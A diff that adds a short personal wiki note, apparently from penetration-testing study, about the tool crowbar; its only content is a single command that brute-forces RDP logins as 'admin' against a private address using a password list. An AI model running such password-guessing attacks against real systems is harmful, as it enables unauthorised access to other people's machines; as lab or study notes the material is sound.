@@ -1,0 +1,10 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2020-05-21T14:31:43-04:00
+
+====== crowbar ======
+Created Thursday 21 May 2020
+
+
+====== rdp attack ======
+**crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1**
